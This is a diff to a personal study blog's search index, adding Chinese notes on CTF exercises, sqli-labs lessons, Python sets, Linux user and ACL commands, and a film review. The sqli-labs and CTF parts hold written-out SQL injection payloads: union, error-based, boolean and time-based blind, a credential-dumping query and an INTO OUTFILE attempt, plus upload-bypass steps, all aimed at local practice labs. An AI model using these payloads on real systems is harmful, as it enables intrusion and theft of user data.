@@ -3,6 +3,44 @@
   
     
     <entry>
+      <title><![CDATA[ctf-syb]]></title>
+      <url>/2018/02/19/ctf-syb/</url>
+      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">
+
+<p>拿点CTF练练手，美滋滋～<a id="more"></a></p>
+<the rest="" of="" contents="" |="" 余下全文="">
+
+
+
+<h3 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h3><p><a href="http://ctf5.shiyanbar.com/DUTCTF/index.php" target="_blank" rel="noopener">解题链接</a></p>
+<p>关键代码：<img src="https://ws1.sinaimg.cn/large/006tNc79gy1fom1wi623zj30js07uq2z.jpg" alt=""></p>
+<p>将hackerDJ url编码之后发现，还是not allowed 。就重新捋了一遍逻辑，发现浏览器url栏上会url解码一次，所以需要将hackerDJ二次url编码，再get进去就得到flag了。</p>
+<h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p><a href="http://www.shiyanbar.com/ctf/1781" target="_blank" rel="noopener">解题链接</a></p>
+<p>一看到上传绕过就想到了00截断</p>
+<p>首先尝试上传php文件，然后发现要上传图片，然后又试了试上传图片，发现成功上传，但是又要求php后缀才行。。于是就觉得是在前端判断是否是图片后缀，然后再判断上传到目录中的文件是否是php来get flag。所以就在burp里改了file name，再改了hex，然后就OK了。</p>
+<h3 id="简单的SQL注入"><a href="#简单的SQL注入" class="headerlink" title="简单的SQL注入"></a>简单的SQL注入</h3><p><a href="http://www.shiyanbar.com/ctf/1875" target="_blank" rel="noopener">解题链接</a></p>
+<p>这个真是“简单”啊。一下子过滤了那么多～～～不过也get也一波绕过waf新方法。。但是，只要把绕过找出来。。藏flag的地方的确很。。。</p>
+<p><a href="http://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html" target="_blank" rel="noopener">深入理解SQL注入绕过WAF和过滤机制</a></p>
+</the></excerpt>]]></content>
+      
+        <categories>
+            
+            <category> Study </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> Summary </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[SQL Injection - Sqli-labs]]></title>
       <url>/2018/02/05/sqlinjection-sqlilabs/</url>
       <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">
@@ -15,6 +53,7 @@
 <p><strong>union的作用是将两个sql语句进行联合。union前后的两个sql语句的选择列数要相同才可以（用order by查询行数） 。Union all与union 的区别是增加了去重的功能</strong></p>
 <h4 id="数据库连接函数"><a href="#数据库连接函数" class="headerlink" title="数据库连接函数"></a>数据库连接函数</h4><p>concat和concat_ws</p>
 <p>其中concat_ws的第一个参数是连接字符串的分隔符，还会用到group__concat(可以把查询出来的多行连接起来)</p>
+<p>常用：concat_ws(char(32,58,32),user(),database(),version())</p>
 <h4 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h4><p>查询information_schema中的信息时，使用where语句，那个值不能直接用英文，要用单引号包裹着，当然用其十六进制表示也可以，数值类型的就不用单引号了</p>
 <h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>查表时也只能返回一个table，所以要用limit来控制结果集具体是哪一行</p>
 <h4 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h4><p>Payload:<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,2,3 –+</p>
@@ -40,7 +79,26 @@
 <p>or</p>
 <p><a href="http://localhost/sqli-labs/Less-4/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-4/index.php/?id=1</a>“) or “1”=(“1</p>
 <h3 id="less-5-GET-Double-Injection-Single-Quotes-String"><a href="#less-5-GET-Double-Injection-Single-Quotes-String" class="headerlink" title="less-5 GET - Double Injection - Single Quotes - String"></a>less-5 GET - Double Injection - Single Quotes - String</h3><p>(双注入GET单引号字符型注入)</p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><strong>count(*)</strong></p>
+<p><a href="http://localhost/sqli-labs/Less-5/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/</a><br>?id=1’ union Select 1,count(<em>),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)\</em>2))a from information_schema.columns group by a–+</p>
+<p><strong>exp</strong></p>
+<p>数据类型超出范围进行报错注入</p>
+<p><strong>bigint</strong></p>
+<p>bigint溢出进行报错注入</p>
+<p><strong>xpath</strong></p>
+<p>xpath函数报错注入</p>
+<p><a href="http://localhost/sqli-labs/Less-5/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/</a><br>?id=1’ and extractvalue(1,concat(0x7e,(select @@version),0x7e))–+</p>
+<p><strong>利用数据的重复性</strong></p>
+<p><a href="http://localhost/sqli-labs/Less-5/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/</a><br>?id=1’union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x –+</p>
+<h4 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h4><p>payload：</p>
+<p>布尔注入：</p>
+<p>报错注入：</p>
+<p><a href="http://localhost/sqli/Less-5/?id=1" target="_blank" rel="noopener">http://localhost/sqli/Less-5/?id=1</a>‘ and (select 1 from(select count(<em>*),concat(char(32,58,32),(select concat_ws(char(32,58,32),id,username,password) from users limit 0,1),char(32,58,32),floor(rand()</em> *2))name from information_schema.tables group by name)b) –+</p>
+<p>延时注入：</p>
+<p><a href="http://localhost/sqli-labs/Less-5/index.php/?id=1&#39;and" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/?id=1&#39;and</a> If(ascii(substr(database(),1,1))=115,1,sleep(5))–+ </p>
+<p><a href="http://localhost/sqli-labs/Less-5/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/</a><br>?id=1’UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE(‘MSG’,’by 5 seconds’)),null)),2,3 FROM (select database() as current) as tb1–+</p>
 <h3 id="less-6-GET-Double-Injection-Double-Quotes-String"><a href="#less-6-GET-Double-Injection-Double-Quotes-String" class="headerlink" title="less-6 GET - Double Injection - Double Quotes - String"></a>less-6 GET - Double Injection - Double Quotes - String</h3><p>(双注入GET双引号字符型注入)</p>
+<p>payload跟less-5异曲同工，只是把 ‘ 改成 “ </p>
 <h3 id="less-7-GET-Dump-into-outfile-String"><a href="#less-7-GET-Dump-into-outfile-String" class="headerlink" title="less-7 GET - Dump into outfile - String"></a>less-7 GET - Dump into outfile - String</h3><p>(导出文件GET字符型注入)</p>
 <p>@@datadir 读取数据库路径<br>@@basedir MYSQL 获取安装路径</p>
 <p>outfile函数将数据库中的内容写到一个文件中</p>
@@ -49,7 +107,55 @@
 <p>虽然有相应数据库权限，也对路径进行了转义，但是还是没有成功导出文件，尝试导出在tmp文件夹，发现也不行。先放着吧！</p>
 <p><a href="http://localhost/sqli-labs/Less-7/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-7/index.php/?id=1</a>‘)) union select 1,2,3 into outfile “C:\phpStudy\tmp\1.php” %23 </p>
 <h3 id="less-8-GET-Blind-Boolian-Based-Single-Quotes"><a href="#less-8-GET-Blind-Boolian-Based-Single-Quotes" class="headerlink" title="less-8 GET - Blind - Boolian Based - Single Quotes"></a>less-8 GET - Blind - Boolian Based - Single Quotes</h3><p>(布尔型单引号GET盲注)</p>
-</the></excerpt>]]></content>
+<p>这一关把mysql报错的语句注释了，所以就不能用报错注入了。</p>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p><strong>left()</strong></p>
+<p>left()得到字符串左部指定个数的字符    </p>
+<p>left ( string, n )        string为要截取的字符串，n为长度。</p>
+<p>正确时返回 “You are in 。。。。“ 否则则无回显。</p>
+<p><strong>length()</strong></p>
+<p>测试数据库长度</p>
+<p><strong>substr()与ascii()并用 </strong></p>
+<p>substr()和substring()函数实现的功能是一样的，均为截取字符串。</p>
+<p>​    string substring(string, start, length)</p>
+<p>​    string substr(string, start, length)</p>
+<p>获取security数据库的第一个表(limit 0,1)的字符</p>
+<p>获取该数据库的第二个表 limit 1,1</p>
+<p><strong>regexp</strong></p>
+<p>利用regexp获取（2）中users表中的列</p>
+<p>I    select * from users where id=1 and 1=(if((user() regexp ‘^r’),1,0));</p>
+<p>II    select * from users where id=1 and 1=(user() regexp’^ri’);</p>
+<p>通过if语句的条件判断，返回一些条件句，比如if等构造一个判断。根据返回结果是否等于0或者1进行判断。</p>
+<p>III    select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 0,1);</p>
+<p>这里利用select构造了一个判断语句。我们只需要更换regexp表达式即可</p>
+<p>‘^u[a-z]’ -&gt; ‘^us[a-z]’ -&gt; ‘^use[a-z]’ -&gt; ‘^user[a-z]’ -&gt; FALSE</p>
+<p><a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">SQL盲注之正则表达式攻击</a></p>
+<p><strong>ord() 和 mid(column_name,start[,length])</strong></p>
+<p>利用 ord()（此函数为返回第一个字符的ASCII码） 和 mid() 函数获取users表的内容</p>
+<p>例如ORD(MID(DATABASE(),1,1))&gt;114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’</p>
+<h3 id="less-9-GET-Blind-Time-based-Single-Quotes"><a href="#less-9-GET-Blind-Time-based-Single-Quotes" class="headerlink" title="less-9 GET - Blind - Time based. -  Single Quotes"></a>less-9 GET - Blind - Time based. -  Single Quotes</h3><p> (基于时间的GET单引号盲注)</p>
+<h4 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h4><p><strong>sleep()</strong></p>
+<p>利用sleep()函数进行注入</p>
+<p><a href="http://localhost/sqli-labs/Less-9/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-9/index.php/</a><br>?id=1’and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+</p>
+<p><strong>BENCHMARK()</strong></p>
+<p>利用BENCHMARK()进行延时注入</p>
+<p>当结果正确的时候，运行ENCODE(‘MSG’,’by 5 seconds’)操作50000000次，会占用一段时间。</p>
+<h4 id="solution-5"><a href="#solution-5" class="headerlink" title="solution"></a>solution</h4><p>payload：</p>
+<p><a href="http://127.0.0.1/sqllib/Less-9/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-9/?id=1&#39;and</a> If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))–+</p>
+<h3 id="less-10-GET-Blind-Time-based-double-quotes"><a href="#less-10-GET-Blind-Time-based-double-quotes" class="headerlink" title="less-10 GET - Blind - Time based - double quotes"></a>less-10 GET - Blind - Time based - double quotes</h3><p> (基于时间的双引号盲注)</p>
+<p>与less-9一样，只是从 ’ 变成 “ </p>
+<h3 id="less-11-POST-Error-Based-single-quotes-String"><a href="#less-11-POST-Error-Based-single-quotes-String" class="headerlink" title="less-11 POST - Error Based - single quotes - String"></a>less-11 POST - Error Based - single quotes - String</h3><p>在GET型里面用到的大部分方法都可以使用</p>
+<h3 id="less-12-POST-Error-Based-Double-quotes-String-with-twist"><a href="#less-12-POST-Error-Based-Double-quotes-String-with-twist" class="headerlink" title="less-12 POST - Error Based - Double quotes - String - with twist"></a>less-12 POST - Error Based - Double quotes - String - with twist</h3><p><strong>’</strong> 变 <strong>”</strong></p>
+<h3 id="less-13-POST-Double-injection-Single-quotes-String-with-twist"><a href="#less-13-POST-Double-injection-Single-quotes-String-with-twist" class="headerlink" title="less-13 POST Double injection - Single quotes - String - with twist"></a>less-13 POST Double injection - Single quotes - String - with twist</h3><p>从错误回显中知道对id进行了 <strong>‘)</strong>处理，所以用布尔盲注来判断是否成功login</p>
+<h4 id="solution-6"><a href="#solution-6" class="headerlink" title="solution"></a>solution</h4><p>payload:</p>
+<p>猜版本号</p>
+<p>uname=admin’)and left(@@version,1)=5%23 &amp;passwd=2222&amp;submit=Submit</p>
+<h3 id="less-14-POST-Double-injection-Single-quotes-String-with-twist"><a href="#less-14-POST-Double-injection-Single-quotes-String-with-twist" class="headerlink" title="less-14 POST - Double injection - Single quotes - String - with twist"></a>less-14 POST - Double injection - Single quotes - String - with twist</h3><p>有报错，可以用报错注入</p>
+<h4 id="solution-7"><a href="#solution-7" class="headerlink" title="solution"></a>solution</h4><p>payload</p>
+<h3 id="less-15-POST-Blind-Boolian-time-Based-Single-quotes"><a href="#less-15-POST-Blind-Boolian-time-Based-Single-quotes" class="headerlink" title="less-15 POST - Blind - Boolian/time Based - Single quotes"></a>less-15 POST - Blind - Boolian/time Based - Single quotes</h3><p>没有错误回显，可以用布尔盲注和延时注入</p>
+<h4 id="solution-8"><a href="#solution-8" class="headerlink" title="solution"></a>solution</h4><p>payload</p>
+<h3 id="less-16-POST-Blind-Boolian-Time-Based-Double-quotes"><a href="#less-16-POST-Blind-Boolian-Time-Based-Double-quotes" class="headerlink" title="less-16 POST - Blind - Boolian/Time Based - Double quotes"></a>less-16 POST - Blind - Boolian/Time Based - Double quotes</h3><p>单引号变双引号</p>
+<h3 id="less-17-POST-Update-Query-Error-Based-String"><a href="#less-17-POST-Update-Query-Error-Based-String" class="headerlink" title="less-17 POST - Update Query - Error Based - String"></a>less-17 POST - Update Query - Error Based - String</h3><p><a href="http://www.cnblogs.com/lcamry/p/5763048.html" target="_blank" rel="noopener">增删改函数介绍</a></p>
+<h3 id="less-18-POST-Header-injection-Uagent-field-Error-based"><a href="#less-18-POST-Header-injection-Uagent-field-Error-based" class="headerlink" title="less-18 POST - Header injection - Uagent field - Error based"></a>less-18 POST - Header injection - Uagent field - Error based</h3><h3 id="less-19-POST-Header-injection-Referer-field-Error-based"><a href="#less-19-POST-Header-injection-Referer-field-Error-based" class="headerlink" title="less-19 POST - Header injection Referer field - Error based"></a>less-19 POST - Header injection Referer field - Error based</h3><h3 id="less-20-POST-Cookie-injection-Uagent-field-error-based"><a href="#less-20-POST-Cookie-injection-Uagent-field-error-based" class="headerlink" title="less-20 POST - Cookie injection - Uagent field - error based"></a>less-20 POST - Cookie injection - Uagent field - error based</h3><h3 id="less-21-POST-Dump-into-outfile-String"><a href="#less-21-POST-Dump-into-outfile-String" class="headerlink" title="less-21 POST Dump into outfile - String"></a>less-21 POST Dump into outfile - String</h3><h3 id="less-22-Future-Editions"><a href="#less-22-Future-Editions" class="headerlink" title="less-22 Future Editions"></a>less-22 Future Editions</h3></the></excerpt>]]></content>
       
         <categories>
             
@@ -78,6 +184,10 @@
 <the rest="" of="" contents="" |="" 余下全文="">
 
 <p>​    高三毕业那个暑假就已经用sqli-lab学了一点点SQL Injection，但是好像还没有彻彻底底的明白payload为何如此构造。。经过一学期的各种学习，做做ctf题，拓展自己的知识面后，现在好像有点恍然大悟的赶脚！！</p>
+<p><br></p>
+<h3 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h3><p><a href="http://blog.csdn.net/linyt/article/details/52966555" target="_blank" rel="noopener">如何利用SQL注入进行爆库</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/22397455?refer=sss95zz" target="_blank" rel="noopener">你真的会SQL注入攻击吗？（上）</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/22397620" target="_blank" rel="noopener">你真的会SQL注入攻击吗？（下）</a></p>
 </the></excerpt>]]></content>
       
         <categories>
@@ -282,7 +392,21 @@
 <p>给字典增加一个item，setdefault(k[,d])，返回k对应的value值，当k不在字典内时则返回d的值，如果d没提供则返回空；同时如果k不存在字典内时，将d作为value映射给k</p>
 <p><strong>update()</strong></p>
 <p>update([E, ]**F) -&gt; None.  Update D from dict/iterable E and F.将一个字典内的item作为item添加到字典内</p>
-</the></excerpt>]]></content>
+<h2 id="27-集合：在我的世界里，你就是唯一"><a href="#27-集合：在我的世界里，你就是唯一" class="headerlink" title="27.集合：在我的世界里，你就是唯一"></a>27.集合：在我的世界里，你就是唯一</h2><p><strong>集合的概念和使用</strong><br>​        在这里集合的概念和数学里集合的概念是一致的，都是一组元素的集，且元素之间不能重复。Python中集合的定义和字典类似，都需要大括号，区别在于集合不需要映射</p>
+<p><strong>set()函数</strong><br>​        和序列工厂函数list()，str()，tuple()一样，可以将序列类型直接强制转换为一个集合类型</p>
+<p>一个列表[1,2,3,4,5,5,3,1,0]，如何去除列表内的重复元素，两种方法可供选择，第一种是常规方法，见下面所示：</p>
+<p>list2 = [1,2,3,4,5,5,3,1,0]<br>list3 = []<br>for each in list2:<br>     if each not in list3:<br>             list3.append(each)<br>list3<br> 2, 3, 4, 5, 0]<br>     第二种方法使用集合的元素不重复性，通过将列表先强制转换为集合，再转换为列表形式实现，举例说明<br>list4 = [1,2,3,4,5,5,3,1,0]<br>list4 = list(set(list4))<br>list4<br> [1, 2, 3, 4, 5]</p>
+<p><strong>add()</strong></p>
+<p>增加一个元素到集合内</p>
+<p><strong>remove()</strong></p>
+<p>从集合内删除一个元素</p>
+<p><strong>frozenset()</strong></p>
+<p>将一个集合冻结使之无法添加和删除元素的函数</p>
+<h2 id="28-文件：因为懂你，所以永恒"><a href="#28-文件：因为懂你，所以永恒" class="headerlink" title="28.文件：因为懂你，所以永恒"></a>28.文件：因为懂你，所以永恒</h2><h2 id="29-文件：一个任务"><a href="#29-文件：一个任务" class="headerlink" title="29.文件：一个任务"></a>29.文件：一个任务</h2><h2 id="30-文件系统：介绍一个高大上的东西"><a href="#30-文件系统：介绍一个高大上的东西" class="headerlink" title="30.文件系统：介绍一个高大上的东西"></a>30.文件系统：介绍一个高大上的东西</h2><p><strong>模块的概念</strong><br>​        模块就是实现特定功能的一类函数和变量的文件，后缀名是.py，它可以被其他程序所调用，调用语句是import。在Python程序中要是用模块的函数需要在前面加上模块名和成员操作符</p>
+<p><strong>os模块</strong><br>​        Python之所以称为跨平台的语言就是因为它具有os模块，使得同样的源代码可以在不同的操作系统上使用。</p>
+<p><strong>os.path模块是完成跟文件路径相关的函数模块</strong></p>
+<p><a href="http://bbs.fishc.com/thread-45512-1-1.html" target="_blank" rel="noopener">os、os.path 模块中关于文件、目录常用的函数使用方法</a></p>
+<h2 id="31-永久存储：腌制一缸美味的跑操"><a href="#31-永久存储：腌制一缸美味的跑操" class="headerlink" title="31.永久存储：腌制一缸美味的跑操"></a>31.永久存储：腌制一缸美味的跑操</h2><h2 id="32-异常处理：你不可能总是对的"><a href="#32-异常处理：你不可能总是对的" class="headerlink" title="32.异常处理：你不可能总是对的"></a>32.异常处理：你不可能总是对的</h2><h2 id="33-异常处理：你不可能总是对的2"><a href="#33-异常处理：你不可能总是对的2" class="headerlink" title="33.异常处理：你不可能总是对的2"></a>33.异常处理：你不可能总是对的2</h2></the></excerpt>]]></content>
       
         <categories>
             
@@ -699,6 +823,70 @@
 <p>-l : 暂时锁定用户。仅root用户可用</p>
 <p>-u : 解锁用户。仅root用户可用</p>
 <p>—stdin 可以通过管道符输出的数据作为用户的密码。</p>
+<h4 id="usermod"><a href="#usermod" class="headerlink" title="usermod"></a>usermod</h4><p><strong>grammar: usermod [选项] 用户名</strong></p>
+<p>-u UID：修改用户的UID号</p>
+<p>-c 用户说明：修改用户的说明信息</p>
+<p>-G 组名：修改用户的附加组</p>
+<p>-L ：临时锁定用户(Lock)</p>
+<p>-U ：解锁用户锁定(Unlock)</p>
+<h4 id="change"><a href="#change" class="headerlink" title="change"></a>change</h4><p><strong>grammar: change [选项] 用户名</strong></p>
+<p>-l：列出用户的详细密码状态</p>
+<p>-d 日期：修改密码最后一次更改日期（shadow3字段）</p>
+<p>-m 天数：两次密码修改间隔（4字段）</p>
+<p>-M 天数：密码有效期（5字段）</p>
+<p>-W 天数：密码过期前警告天数（6字段）</p>
+<p>-I 天数：密码过期后宽限天数（7字段）</p>
+<p>-E 日期：账号失效时间（8字段）</p>
+<h4 id="userdel"><a href="#userdel" class="headerlink" title="userdel"></a>userdel</h4><p><strong>grammar: userdel [-r] 用户名</strong></p>
+<p>-r：删除用户的同时删除用户家目录</p>
+<h4 id="id"><a href="#id" class="headerlink" title="id"></a>id</h4><p><strong>grammar: id 用户名</strong></p>
+<h4 id="su"><a href="#su" class="headerlink" title="su"></a>su</h4><p><strong>grammar: su [选项] 用户名</strong></p>
+<p>-：选项只使用“-”代表连带用户的环境变量一起切换</p>
+<p>-c：仅执行一次命令，而不切换用户身份</p>
+<h3 id="用户组管理命令"><a href="#用户组管理命令" class="headerlink" title="用户组管理命令"></a>用户组管理命令</h3><h4 id="groupadd"><a href="#groupadd" class="headerlink" title="groupadd"></a>groupadd</h4><p><strong>grammar: groupadd [选项] 组名</strong></p>
+<p>-g GID：指定组ID</p>
+<h4 id="groupmod"><a href="#groupmod" class="headerlink" title="groupmod"></a>groupmod</h4><p><strong>grammar: groupmod [选项] 组名</strong></p>
+<p>-g GID：修改组ID</p>
+<p>-n 新组名：修改组名</p>
+<h4 id="groupdel"><a href="#groupdel" class="headerlink" title="groupdel"></a>groupdel</h4><p><strong>grammar: groupdel 组名</strong></p>
+<h4 id="gpasswd"><a href="#gpasswd" class="headerlink" title="gpasswd"></a>gpasswd</h4><p><strong>grammar: gpasswd [选项] 组名</strong></p>
+<p>-a 用户名：把用户加入组</p>
+<p>-d 用户名：把用户从组中删除</p>
+<h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><h3 id="ACL权限"><a href="#ACL权限" class="headerlink" title="ACL权限"></a>ACL权限</h3><h4 id="查看分区ACL权限是否开启"><a href="#查看分区ACL权限是否开启" class="headerlink" title="查看分区ACL权限是否开启"></a>查看分区ACL权限是否开启</h4><p><strong>grammar: dump2fs -h /dev/sda3</strong></p>
+<p>-h 仅显示超级块中信息，而不显示磁盘块组的详细信息</p>
+<p>df -h 查看硬盘分区情况</p>
+<h4 id="临时开启分区ACL权限"><a href="#临时开启分区ACL权限" class="headerlink" title="临时开启分区ACL权限"></a>临时开启分区ACL权限</h4><p><strong>grammar: mount -o remount,acl/</strong></p>
+<h4 id="永久开启分区ACL权限"><a href="#永久开启分区ACL权限" class="headerlink" title="永久开启分区ACL权限"></a>永久开启分区ACL权限</h4><p>vi /etc/fstab</p>
+<p>将defaults后面加上 <strong>,acl</strong></p>
+<p>然后 重启挂载文件系统（mount -o remount /）或者重启系统，使修改生效</p>
+<h4 id="查看与设定ACL权限"><a href="#查看与设定ACL权限" class="headerlink" title="查看与设定ACL权限"></a>查看与设定ACL权限</h4><p><strong>grammar: getfacle 文件名</strong></p>
+<p>查看acl权限</p>
+<p><strong>grammar: setfacl 选项 文件名</strong></p>
+<p>-m：设定acl权限</p>
+<p>-x：删除指定的acl权限</p>
+<p>-b：删除所有的acl权限</p>
+<p>-d：设定默认acl权限</p>
+<p>-k：删除默认acl权限</p>
+<p>-R：递归设定acl权限</p>
+<p>给用户设定acl权限：setfacl -m u:st:rx /project</p>
+<p>给用户组设定acl权限：setfacl -m g:tgroup2:rwx project/</p>
+<h4 id="最大有效权限mask"><a href="#最大有效权限mask" class="headerlink" title="最大有效权限mask"></a>最大有效权限mask</h4><p>修改最大有效权限</p>
+<p><strong>grammar: setfacl -m m:rx 文件名</strong></p>
+<h4 id="删除ACL权限"><a href="#删除ACL权限" class="headerlink" title="删除ACL权限"></a>删除ACL权限</h4><p>删除指定用户的ACL权限</p>
+<p><strong>grammar: setfacl -x u:用户名 文件名</strong></p>
+<p>删除指定用户组的ACL权限</p>
+<p><strong>grammar: setfacl -x g:组名 文件名</strong></p>
+<h4 id="默认ACL权限"><a href="#默认ACL权限" class="headerlink" title="默认ACL权限"></a>默认ACL权限</h4><p><strong>grammar: setfacl -m d:u:用户名:权限 文件名</strong></p>
+<h4 id="递归ACL权限"><a href="#递归ACL权限" class="headerlink" title="递归ACL权限"></a>递归ACL权限</h4><p><strong>grammar: setfacl -m u:用户名 -R 文件名</strong></p>
+<h3 id="文件特殊权限"><a href="#文件特殊权限" class="headerlink" title="文件特殊权限"></a>文件特殊权限</h3><h4 id="SetUID"><a href="#SetUID" class="headerlink" title="SetUID"></a>SetUID</h4><p>设定SetUID的方法</p>
+<p>chmod 4755 文件名</p>
+<p>chmod u+s 文件名</p>
+<p>取消SetUID的方法</p>
+<p>chmod 755 文件名</p>
+<p>Chmod u-s 文件名</p>
+<h4 id="SetGID"><a href="#SetGID" class="headerlink" title="SetGID"></a>SetGID</h4><p>设定SetGID  2代表SGID</p>
+<p>chmod 2755 文件名</p>
+<p>chmod g+s 文件名</p>
 </the></excerpt>]]></content>
       
         <categories>
@@ -795,6 +983,7 @@
 <p>更多细致影评：<a href="https://www.zhihu.com/question/35875851" target="_blank" rel="noopener">如何评价《实习生》（The Intern）这部电影？</a></p>
 <h3 id="前任3-再见前任"><a href="#前任3-再见前任" class="headerlink" title="前任3-再见前任"></a>前任3-再见前任</h3><p>​    我好像1-2-3，都看了～感觉除了虐还是虐～催泪部分都给我免疫了～～emm～～</p>
 <h3 id="Paterson-帕特森"><a href="#Paterson-帕特森" class="headerlink" title="Paterson 帕特森"></a>Paterson 帕特森</h3><p>一部平淡的文艺片～</p>
+<h3 id="Arrival-降临"><a href="#Arrival-降临" class="headerlink" title="Arrival 降临"></a>Arrival 降临</h3><p>​    Wow，这部片开头我其实没看懂～～～但是。看到后面我着实是看上瘾了。特别是结局～～这个脑洞。。。I like it！！Fantastic！！！！</p>
 </the>]]></content>
       
         <categories>
